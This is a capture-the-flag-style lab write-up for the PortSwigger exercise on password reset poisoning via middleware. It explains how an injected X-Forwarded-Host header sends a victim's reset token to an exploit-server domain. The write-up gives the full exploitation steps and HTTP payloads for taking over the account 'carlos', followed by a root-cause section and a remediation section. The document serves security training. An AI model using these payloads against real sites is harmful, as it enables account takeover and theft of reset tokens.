## Metadata

- **Difficulty:** Practitioner
- **Category:** Authentication / HTTP Host header attacks
- **Lab URL:** [Lab: Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
- **Date Solved:** 29/4/2026
## Vulnerability Summary

The app is vulnerable to password reset poisoning via middleware. While the backend strictly validates or routes based on the primary `Host` header, it blindly trusts the `X-Forwarded-Host` header. By injecting this header with the domain of an exploit server, we can poison the dynamically generated password reset link sent to a victim. When the victim clicks the link, their reset token is leaked to the attacker, allowing for full account takeover.
## Reconnaissance

Intercepted the `POST /forgot-password` request. Attempting to modify the primary `Host` header directly results in the HTTP Response `403 Forbidden` and a `Client Error` in the response body. However, injecting the `X-Forwarded-Host` header with an arbitrary domain (e.g., `X-Forwarded-Host: example.com`), we get a `200 OK` and a response message that reads `Please check your email for a reset password link.` Checking the email client for our account (`wiener`) reveals that the reset link is constructed using the injected header value. This indicates that a frontend proxy or middleware is passing this header to the backend, which relies on it for URL generation.
## Exploitation Steps

1. Navigate to `url/login` and access `url/forgot-password`. Intercept the request to submit `wiener` and send to the Repeater (Burp Suite)/Replay (Caido). We will refer to this request later as "**the first intercepted request**".
2. Go to exploit server, then on it, access the email client for the recovery link. Follow this link, where you are prompted to type in and confirm your new password. Type in anything, e.g. "a". Intercept this request before you click "Submit". We will refer to this request later as "**the second intercepted request".
3. On the first intercepted request, first, add the `X-Forwarded-Host` header, with its value being your exploit server's domain: `X-Forwarded-Host: exploit-domainname.exploit-server.net`. Then, on the request body, change the value of the `username` field to `carlos`. After doing both of these things, send the request. You should receive a HTTP response with a status code `200 OK` that reads `Please check your email for a reset password link.`A password reset token for the user `carlos` has been generated successfully, and since we add the `X-Forwarded-Host` header to the exploit server that we control, we have access to this token.
4. Navigate to `https://exploit-domainname.exploit-server.net/log`. You should see a line that reads something like `<timestamp> "GET //forgot-password?temp-forgot-password-token=carlos'stoken HTTP/1.1" 404 "user-agent:...`. Copy `carlos'stoken` (this is a random string that differs from session to session).
5. On the second intercepted request, change the value of the `temp-forgot-password-token` in **both** the HTTP header and body. For the password, you can pick any value you like - this is the value that we will use to access `carlos`'s account. In my case, I pick `a`. The value should look like below. After doing the necessary modifications, send the request.
```
POST /forgot-password?temp-forgot-password-token=carlos'stoken HTTP/1.1
Host: randomstring.web-security-academy.net

...

temp-forgot-password-token=carlos'stoken&new-password-1=a&new-password-2=a
```
6. Observe that you received a `302 Found` HTTP Response, indicating a redirection. Go on to the website, login with the credentials `carlos - yourvalue`. You should see that you're logged in as `carlos`, and lab is solved.
## Payload Used

`X-Forwarded-Host: exploit-randomstring.exploit-server.net`
`POST /forgot-password?temp-forgot-password-token=carlos'stoken HTTP/1.1`
`temp-forgot-password-token=carlos'stoken&new-password-1=a&new-password-2=a`

The frontend load balancer routes the request to the correct backend using the `Host` header. The backend framework, however, prioritizes the `X-Forwarded-Host` header (intended to tell the backend the original host requested by the client) when dynamically generating absolute URLs.
## Root Cause

The application middleware passes the user-controllable `X-Forwarded-Host` header to the backend, which blindly trusts it to generate absolute URLs for sensitive actions, in this case password resets. There is no validation to ensure the forwarded host matches the application's actual domain.
## Remediation

Do not rely on `X-Forwarded-*` headers for application logic or URL generation unless absolutely necessary. If they must be used, the application must strictly validate the `X-Forwarded-Host` header against a whitelist of trusted domains. Ideally, configure a static, absolute base URL in the application's environment configuration to handle all link generation securely.

